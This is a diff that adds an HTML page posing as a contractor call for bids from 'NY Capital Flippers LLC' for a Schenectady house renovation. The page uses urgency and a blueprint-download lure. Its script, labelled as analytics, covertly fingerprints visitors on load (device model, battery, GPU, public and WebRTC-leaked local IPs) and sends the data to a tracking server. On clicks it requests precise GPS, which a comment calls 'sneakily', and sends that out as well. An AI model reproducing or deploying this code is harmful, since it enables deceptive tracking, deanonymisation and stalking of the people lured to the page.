@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schenectady Heritage Renovation Project - Call for Bids</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --primary-yellow: #ffc107;
+            /* Industrial Yellow */
+            --dark-gray: #212529;
+            /* Industrial Black/Dark Gray */
+            --light-gray: #f8f9fa;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: var(--dark-gray);
+            background-color: var(--light-gray);
+            line-height: 1.6;
+        }
+
+        /* Header / Navbar */
+        .navbar-custom {
+            background-color: var(--dark-gray);
+            border-bottom: 4px solid var(--primary-yellow);
+        }
+
+        .navbar-brand {
+            color: white !important;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(rgba(33, 37, 41, 0.85), rgba(33, 37, 41, 0.85)),
+                url('images/fuck/1.PNG') no-repeat center center/cover;
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+            border-bottom: 5px solid var(--primary-yellow);
+        }
+
+        .hero h1 {
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            color: var(--primary-yellow);
+        }
+
+        .hero .lead {
+            font-size: 1.5rem;
+            font-weight: 300;
+            margin-bottom: 30px;
+        }
+
+        .highlight-banner {
+            background-color: var(--primary-yellow);
+            color: var(--dark-gray);
+            font-weight: bold;
+            display: inline-block;
+            padding: 10px 25px;
+            border-radius: 4px;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .highlight-banner:hover {
+            background-color: #e0a800;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        /* Main Content Section */
+        .project-details {
+            padding: 60px 0;
+            background-color: white;
+        }
+
+        .section-title {
+            font-weight: 800;
+            text-transform: uppercase;
+            border-bottom: 4px solid var(--primary-yellow);
+            display: inline-block;
+            padding-bottom: 8px;
+            margin-bottom: 35px;
+            color: #111;
+            letter-spacing: 1px;
+        }
+
+        .feature-box {
+            background-color: var(--light-gray);
+            border-left: 4px solid var(--dark-gray);
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .feature-box:hover {
+            transform: translateX(5px);
+            border-left-color: var(--primary-yellow);
+        }
+
+        .feature-icon {
+            color: var(--primary-yellow);
+            font-size: 2rem;
+            margin-bottom: 15px;
+        }
+
+        /* Sidebar CTA */
+        .cta-sidebar {
+            background-color: var(--dark-gray);
+            color: white;
+            padding: 30px;
+            border-radius: 8px;
+            border-top: 5px solid var(--primary-yellow);
+            position: sticky;
+            top: 20px;
+        }
+
+        .cta-sidebar h3 {
+            color: var(--primary-yellow);
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .btn-custom-primary {
+            background-color: var(--primary-yellow);
+            color: var(--dark-gray);
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 15px 25px;
+            font-size: 1.1rem;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-custom-primary:hover {
+            background-color: #e0a800;
+            color: var(--dark-gray);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--dark-gray);
+            color: #adb5bd;
+            padding: 30px 0;
+            text-align: center;
+            border-top: 1px solid #343a40;
+        }
+
+        /* Photo Click Tracer */
+        .property-photo {
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .property-photo:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3) !important;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .hero {
+                padding: 40px 15px;
+            }
+
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+
+            .hero .lead {
+                font-size: 1.1rem;
+            }
+
+            .highlight-banner {
+                font-size: 1rem;
+                padding: 12px 15px;
+                display: block;
+                width: 100%;
+                margin-top: 25px !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark navbar-custom py-3">
+        <div class="container">
+            <a class="navbar-brand mb-0 h1 d-flex align-items-center" href="#">
+                <i class="fa-solid fa-hard-hat text-warning me-2 fs-3"></i>
+                <div>
+                    <div style="line-height: 1;">NY Capital</div>
+                    <div class="text-warning" style="font-size: 0.8rem; letter-spacing: 2px;">FLIPPERS LLC</div>
+                </div>
+            </a>
+
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#mainNav"
+                aria-controls="mainNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="mainNav">
+                <ul class="navbar-nav ms-auto align-items-center">
+                    <li class="nav-item">
+                        <a class="nav-link active fw-bold text-white px-3" aria-current="page" href="#">Current RFPs</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link text-white px-3" href="#about">About Us</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link text-white px-3" href="#portfolio">Past Projects</a>
+                    </li>
+                    <li class="nav-item ms-lg-3 mt-3 mt-lg-0">
+                        <a class="btn btn-outline-warning btn-sm fw-bold px-3 py-2 w-100" href="#"><i
+                                class="fa-solid fa-user me-1"></i> Contractor Portal Login</a>
+                    </li>
+                    <li class="nav-item ms-lg-2 mt-2 mt-lg-0">
+                        <a class="btn btn-warning btn-sm fw-bold px-3 py-2 text-dark w-100" href="#"><i
+                                class="fa-solid fa-file-invoice-dollar me-1"></i> Pay Bid Fee ($0.00)</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Schenectady Revitalization Initiative</h1>
+            <p class="lead">Accelerated Bid Solicitation for Primary Contractors</p>
+            <button class="highlight-banner mt-3">
+                <i class="fa-solid fa-bolt me-2"></i> $150,000 Cash Budget - Immediate Start
+            </button>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <section class="project-details">
+        <div class="container">
+            <div class="row">
+                <!-- Left Column: Project Details -->
+                <div class="col-lg-8 pe-lg-5 mb-5 mb-lg-0">
+                    <h2 class="section-title">Project Overview</h2>
+
+                    <div class="alert alert-warning mb-4 shadow-sm" role="alert">
+                        <strong><i class="fa-solid fa-triangle-exclamation me-2"></i> TIME-SENSITIVE
+                            SOLICITATION:</strong>
+                        We are accelerating our procurement timeline to secure a primary contractor within the next
+                        <strong>7 business days</strong>. Immediate on-site mobilization is required upon contract
+                        execution.
+                    </div>
+
+                    <div id="about" class="bg-light p-4 rounded border-start border-4 border-dark mb-5">
+                        <h4 class="fw-bold mb-3"><i class="fa-solid fa-building text-secondary me-2"></i> About NY
+                            Capital Flippers LLC</h4>
+                        <p class="mb-0 text-dark" style="font-size: 1rem; line-height: 1.7;">
+                            Founded in 2018, NY Capital Flippers LLC is a premier real estate investment group
+                            specializing in the acquisition and rehabilitation of distressed residential properties
+                            across the Capital Region and Upstate New York. Backed by private equity, we manage a
+                            rolling portfolio of $5M+ in active developments. We partner exclusively with top-tier local
+                            contractors who value rapid payouts, clear scopes, and steady year-round project flow.
+                        </p>
+                    </div>
+
+                    <p class="mb-4 text-dark" style="font-size: 1.1rem; line-height: 1.8;">
+                        Our principal investment consortium has recently closed on a
+                        distressed heritage residential asset located within Schenectady, NY. The property has remained
+                        uninhabited for an extended lifecycle and necessitates a rigorous, code-compliant <strong>Full
+                            Gut Restoration</strong> to bring it up to modern market standards.
+                    </p>
+
+                    <p class="mb-5 text-dark" style="font-size: 1.1rem; line-height: 1.8;">
+                        We are exclusively soliciting bids from licensed, bonded, and fully insured contracting firms or
+                        highly specialized architectural rehabilitation teams. The selected vendor must possess the
+                        logistical bandwidth to assume supreme operational control of this site immediately. To
+                        facilitate aggressive project pacing, all disbursements are structured strictly on a
+                        <strong>pre-funded milestone basis</strong>, ensuring uninterrupted liquidity and steady cash
+                        flow for the executing team.
+                    </p>
+
+                    <h3 class="h4 fw-bold mt-5 mb-3 text-uppercase border-start border-warning border-4 ps-3">Project
+                        Timeline & Execution Milestones</h3>
+                    <div class="card border-0 shadow-sm mb-5 rounded-0">
+                        <div class="card-body p-4 bg-white">
+                            <ul class="list-unstyled mb-0">
+                                <li class="mb-3 border-bottom pb-3"><i
+                                        class="fa-solid fa-calendar-check text-warning me-3 fs-5"></i> <strong>Phase 1
+                                        (Days 1-7):</strong> Mandatory Site securing, debris removal, and complete gut
+                                    demolition.</li>
+                                <li class="mb-3 border-bottom pb-3"><i
+                                        class="fa-solid fa-hammer text-warning me-3 fs-5"></i> <strong>Phase 2 (Days
+                                        8-21):</strong> Structural reinforcement, basement leveling, and weatherproofing
+                                    shell.</li>
+                                <li class="mb-3 border-bottom pb-3"><i
+                                        class="fa-solid fa-bolt text-warning me-3 fs-5"></i> <strong>Phase 3 (Days
+                                        22-35):</strong> Rough-in MEP (Mechanical, Electrical, Plumbing) and municipal
+                                    inspections.</li>
+                                <li><i class="fa-solid fa-paint-roller text-warning me-3 fs-5"></i> <strong>Phase 4
+                                        (Days 36-60):</strong> Drywall, interior finishes, fixtures, and final
+                                    hand-over.</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h3 class="h4 fw-bold mt-4 mb-3">Property Photos</h3>
+                    <div class="row g-3 mb-5">
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/1.PNG" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 1" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/2.PNG" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 2" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/3.PNG" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 3" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/4.PNG" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 4" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/5.PNG" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 5" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <img src="images/fuck/6.png" class="img-fluid rounded shadow-sm property-photo"
+                                alt="Property Photo 6" style="height: 200px; width: 100%; object-fit: cover;">
+                        </div>
+                    </div>
+
+                    <h3 class="h4 fw-bold mt-5 mb-3">Scope of Work Elements</h3>
+
+                    <div class="row g-4 mt-2">
+                        <div class="col-md-6">
+                            <div class="feature-box h-100">
+                                <i class="fa-solid fa-hammer feature-icon"></i>
+                                <h4 class="h5 fw-bold">Interior Demolition</h4>
+                                <p class="mb-0 text-muted">Complete strip down down to studs. Removal of outdated
+                                    kitchen, multiple baths, and degraded flooring.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="feature-box h-100">
+                                <i class="fa-solid fa-layer-group feature-icon"></i>
+                                <h4 class="h5 fw-bold">Structural Work</h4>
+                                <p class="mb-0 text-muted">Basement reinforcement required per engineering report,
+                                    alongside minor framing corrections.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="feature-box h-100">
+                                <i class="fa-solid fa-bolt feature-icon"></i>
+                                <h4 class="h5 fw-bold">MEP Upgrades</h4>
+                                <p class="mb-0 text-muted">Installation of new high-efficiency HVAC system and complete
+                                    electrical panel/wiring upgrade.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="feature-box h-100">
+                                <i class="fa-solid fa-house-chimney feature-icon"></i>
+                                <h4 class="h5 fw-bold">Exterior Rehab</h4>
+                                <p class="mb-0 text-muted">Siding repairs, weatherproofing, and heritage-compliant
+                                    modifications to façade.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h3 class="h4 fw-bold mt-5 mb-3 text-uppercase border-start border-warning border-4 ps-3">Contractor
+                        Eligibility Requirements</h3>
+                    <div class="alert alert-secondary border-0 mb-5 rounded-0 ps-4">
+                        <ul class="mb-0 text-dark" style="line-height: 1.8;">
+                            <li>Valid New York State General Contractor License.</li>
+                            <li>Minimum $2M General Liability & Worker's Compensation Insurance.</li>
+                            <li>Demonstrated portfolio of at least 3 historical/heritage gut rehabs in the Capital
+                                Region.</li>
+                            <li>Capacity to float initial $25k mobilization capital (reimbursed at Milestone 1).</li>
+                            <li>Strict adherence to OSHA safety protocols.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Right Column: Sidebar / CTA -->
+                <div class="col-lg-4">
+                    <div class="cta-sidebar">
+                        <h3>Contractor Bidding Packet</h3>
+                        <p class="mb-4">To submit an accurate quote, please review the complete project documentation.
+                            The packet includes:</p>
+
+                        <ul class="list-unstyled mb-4 text-light">
+                            <li class="mb-2"><i class="fa-solid fa-check text-warning me-2"></i> Current AS-IS Site
+                                Photos</li>
+                            <li class="mb-2"><i class="fa-solid fa-check text-warning me-2"></i> Existing Floor Plans
+                            </li>
+                            <li class="mb-2"><i class="fa-solid fa-check text-warning me-2"></i> Structural Engineering
+                                Report</li>
+                            <li class="mb-2"><i class="fa-solid fa-check text-warning me-2"></i> Required Materials List
+                            </li>
+                        </ul>
+
+                        <div class="text-center">
+                            <!-- Placeholder Link -->
+                            <a href="#" class="btn btn-custom-primary mb-3" id="pdfDownloadBtn">
+                                <i class="fa-solid fa-file-pdf me-2"></i> Download Blueprints &amp; Plans (PDF)
+                            </a>
+                            <small class="text-muted d-block"><i class="fa-solid fa-lock me-1"></i> Secure File Transfer
+                                | ~24MB</small>
+                        </div>
+
+                        <hr class="border-secondary my-4">
+
+                        <div class="project-meta">
+                            <p class="mb-1 text-uppercase text-muted small fw-bold">Location</p>
+                            <p class="mb-3 text-white">Schenectady, NY 12302</p>
+
+                            <p class="mb-1 text-uppercase text-muted small fw-bold">Project Type</p>
+                            <p class="mb-3 text-white">Residential Gut Renovation</p>
+
+                            <p class="mb-1 text-uppercase text-muted small fw-bold">Status</p>
+                            <p class="mb-0"><span class="badge bg-success px-3 py-2">ACCEPTING BIDS</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="pt-5 pb-4 border-top border-warning border-5 position-relative" style="background-color: #1a1e21;">
+        <div class="container text-md-start text-center">
+            <div class="row text-light">
+
+                <!-- Company Info Box -->
+                <div class="col-md-4 col-lg-4 col-xl-4 mx-auto mb-4">
+                    <h5 class="text-uppercase fw-bold text-warning mb-4">
+                        <i class="fa-solid fa-hard-hat me-2"></i>NY Capital Flippers LLC
+                    </h5>
+                    <p class="text-light mb-3" style="font-size: 0.95rem; line-height: 1.6;">
+                        Specializing in high-yield distressed asset rehabilitation and commercial property turnaround
+                        across the NY Capital Region.
+                    </p>
+                    <p class="text-light mb-0" style="font-size: 0.95rem;">
+                        NYS Dept. of State ID: <strong class="text-warning">#5492811</strong><br>
+                        Registered Contractor: <strong class="text-warning">#C-99214</strong>
+                    </p>
+                </div>
+
+                <!-- Quick Links -->
+                <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mb-4">
+                    <h6 class="text-uppercase fw-bold mb-4">Contractors</h6>
+                    <p><a href="#" class="text-secondary text-decoration-none small hover-warning">Submit Bid Portal</a>
+                    </p>
+                    <p><a href="#" class="text-secondary text-decoration-none small hover-warning">Payment Schedules</a>
+                    </p>
+                    <p><a href="#" class="text-secondary text-decoration-none small hover-warning">Safety Protocols</a>
+                    </p>
+                    <p><a href="#" class="text-secondary text-decoration-none small hover-warning">Supplier
+                            Directory</a></p>
+                </div>
+
+                <!-- Contact Info -->
+                <div class="col-md-4 col-lg-3 col-xl-3 mx-auto mb-md-0 mb-4">
+                    <h6 class="text-uppercase fw-bold mb-4">Corporate Office</h6>
+                    <p class="small text-secondary mb-2"><i class="fas fa-home me-3 text-warning"></i> 41 State Street,
+                        Suite 802</p>
+                    <p class="small text-secondary mb-2" style="padding-left: 32px;">Albany, NY 12207</p>
+                    <p class="small text-secondary mb-2"><i class="fas fa-envelope me-3 text-warning"></i>
+                        bids@nycapflippers.com</p>
+                    <p class="small text-secondary mb-2"><i class="fas fa-phone me-3 text-warning"></i> +1 (518)
+                        555-0198</p>
+                    <p class="small text-secondary mb-0"><i class="fas fa-print me-3 text-warning"></i> +1 (518)
+                        555-0199 [Fax]</p>
+                </div>
+
+                <!-- Social & Legal -->
+                <div class="col-md-2 col-lg-3 col-xl-3 mx-auto mt-3 mt-md-0">
+                    <h6 class="text-uppercase fw-bold mb-4">Connect</h6>
+                    <a href="#" class="btn btn-outline-secondary btn-sm rounded-circle me-2 mb-2"><i
+                            class="fab fa-linkedin-in text-light"></i></a>
+                    <a href="#" class="btn btn-outline-secondary btn-sm rounded-circle me-2 mb-2"><i
+                            class="fab fa-twitter text-light"></i></a>
+                    <a href="#" class="btn btn-outline-secondary btn-sm rounded-circle mb-2"><i
+                            class="fab fa-facebook-f text-light"></i></a>
+                </div>
+            </div>
+
+            <hr class="mb-4 mt-4" style="border-color: #333;">
+
+            <div class="row align-items-center">
+                <div class="col-md-7 col-lg-8">
+                    <p class="text-muted small mb-0">
+                        &copy; 2024 NY Capital Flippers LLC. All project details are preliminary subject to final
+                        contract.<br>
+                        <a href="#" class="text-secondary">Privacy Policy</a> &middot; <a href="#"
+                            class="text-secondary">Terms of Service</a>
+                    </p>
+                </div>
+                <div class="col-md-5 col-lg-4 text-md-end text-center mt-3 mt-md-0">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Equal_Housing_Opportunity_logo.svg/1024px-Equal_Housing_Opportunity_logo.svg.png"
+                        alt="Equal Housing Opportunity" style="height: 35px; opacity: 0.6; filter: invert(1);">
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Analytics Tracking Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            let visitorId = null;
+
+            // Get Screen Resolution
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+            // Get Battery Info
+            let batteryInfo = 'Unknown';
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100) + '%';
+                    const charging = battery.charging ? '(Charging)' : '(No Charge)';
+                    batteryInfo = `${level} ${charging}`;
+                }
+            } catch (err) { }
+
+            // Guess specific Apple Device Models
+            let guessedDevice = null;
+            try {
+                const ua = navigator.userAgent;
+                const width = window.screen.width;
+                const height = window.screen.height;
+                const shortSide = Math.min(width, height);
+                const longSide = Math.max(width, height);
+                const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+                const isMac = /Macintosh/.test(ua);
+
+                if (isIOS) {
+                    if (shortSide === 430 && longSide === 932) guessedDevice = "iPhone 14 Pro Max / 15/16 Plus";
+                    else if (shortSide === 393 && longSide === 852) guessedDevice = "iPhone 14 Pro / 15/16";
+                    else if (shortSide === 428 && longSide === 926) guessedDevice = "iPhone 12/13/14 Pro Max";
+                    else if (shortSide === 390 && longSide === 844) guessedDevice = "iPhone 12/13/14";
+                    else if (shortSide === 414 && longSide === 896) guessedDevice = "iPhone 11 / XR / XS Max";
+                    else if (shortSide === 375 && longSide === 812) guessedDevice = "iPhone X / XS / 11 Pro";
+                    else if (shortSide === 414 && longSide === 736) guessedDevice = "iPhone 6/7/8 Plus";
+                    else if (shortSide === 375 && longSide === 667) guessedDevice = "iPhone 6/7/8 / SE";
+                    else if (shortSide >= 768) guessedDevice = "iPad";
+                } else if (isMac) {
+                    let chip = 'Intel/M-Series';
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (gl) {
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            const m_match = renderer.match(/Apple M\d/);
+                            if (m_match) {
+                                chip = m_match[0];
+                            } else if (renderer.includes('Apple')) {
+                                chip = 'Apple Silicon';
+                            } else if (renderer.includes('Intel')) {
+                                chip = 'Intel';
+                            }
+                        }
+                    } catch (e) { }
+
+                    if (longSide === 1512) guessedDevice = `MacBook Pro 14" (${chip})`;
+                    else if (longSide === 1728) guessedDevice = `MacBook Pro 16" (${chip})`;
+                    else if (longSide === 1440 || longSide === 2560) guessedDevice = `MacBook 13" (${chip})`;
+                    else guessedDevice = `Mac/iMac (${chip})`;
+                }
+            } catch (err) { }
+
+            // Collect All IPs (IPv4, IPv6, Local)
+            let ipv4 = 'Unknown';
+            let ipv6 = 'Unknown';
+            let localIps = [];
+
+            // 1. Get IPv4
+            try {
+                const res4 = await fetch('https://api.ipify.org?format=json');
+                const data4 = await res4.json();
+                ipv4 = data4.ip;
+            } catch (err) { }
+
+            // 2. Get IPv6
+            try {
+                const res6 = await fetch('https://api64.ipify.org?format=json');
+                const data6 = await res6.json();
+                if (data6.ip !== ipv4) ipv6 = data6.ip;
+            } catch (err) { }
+
+            // 3. WebRTC Local IP
+            try {
+                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+                if (RTCPeerConnection) {
+                    const rtc = new RTCPeerConnection({ iceServers: [] });
+                    rtc.createDataChannel('');
+                    rtc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+                            const match = e.candidate.candidate.match(ipRegex);
+                            if (match) {
+                                match.forEach(ip => {
+                                    if (!localIps.includes(ip) && ip !== '0.0.0.0' && !ip.endsWith('.local')) {
+                                        localIps.push(ip);
+                                    }
+                                });
+                            }
+                        }
+                    };
+                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer)).catch(() => { });
+                    await new Promise(r => setTimeout(r, 800)); // Wait for ICE candidates
+                    rtc.close();
+                }
+            } catch (err) { }
+
+            let fullIpString = `IPv4: ${ipv4}`;
+            if (ipv6 !== 'Unknown') fullIpString += ` | IPv6: ${ipv6}`;
+            if (localIps.length > 0) fullIpString += ` | Local: ${localIps.join(', ')}`;
+
+            // Ping to track entering
+            try {
+                const res = await fetch('http://localhost:3000/api/track/enter', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        visited_url: window.location.pathname,
+                        screen_resolution: screenRes,
+                        battery_info: batteryInfo,
+                        action: 'VIEW',
+                        public_ip: fullIpString,
+                        lookup_ip: ipv4,
+                        guessed_device: guessedDevice
+                    })
+                });
+                const data = await res.json();
+                if (data.visitor_id) visitorId = data.visitor_id;
+            } catch (err) { }
+
+            // Action Tracking (PDF Click & Geolocation Trigger)
+            const trackActionAndGeo = async (actionName) => {
+                if (!visitorId) return;
+
+                // 1. Log the click action
+                try {
+                    await fetch('http://localhost:3000/api/track/action', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ visitor_id: visitorId, action: actionName })
+                    });
+                } catch (e) { }
+
+                // 2. Sneakily Request Exact GPS Location when they click
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        try {
+                            const baseUrl = window.location.origin.includes('5500') ? 'http://localhost:3000' : window.location.origin;
+                            await fetch(`${baseUrl}/api/track/location`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    visitor_id: visitorId,
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude
+                                })
+                            });
+                        } catch (e) { }
+                    }, (err) => {
+                        console.warn("GPS Denied or Unavailable", err);
+                    }, { enableHighAccuracy: true, timeout: 5000 });
+                }
+            };
+
+            // Bind to Download PDF
+            document.getElementById('pdfDownloadBtn')?.addEventListener('click', () => {
+                trackActionAndGeo('CLICK PDF');
+            });
+
+            // Bind to the Highlighting Banner up top
+            document.querySelector('.highlight-banner')?.addEventListener('click', () => {
+                trackActionAndGeo('CLICK BANNER');
+            });
+
+            // Catch clicks on all property photos
+            document.querySelectorAll('.property-photo').forEach(photo => {
+                photo.addEventListener('click', () => {
+                    trackActionAndGeo('VIEW PHOTO');
+                });
+            });
+
+            // Ping to track leaving
+            window.addEventListener('beforeunload', () => {
+                if (visitorId) {
+                    navigator.sendBeacon('http://localhost:3000/api/track/leave',
+                        JSON.stringify({ visitor_id: visitorId })
+                    );
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
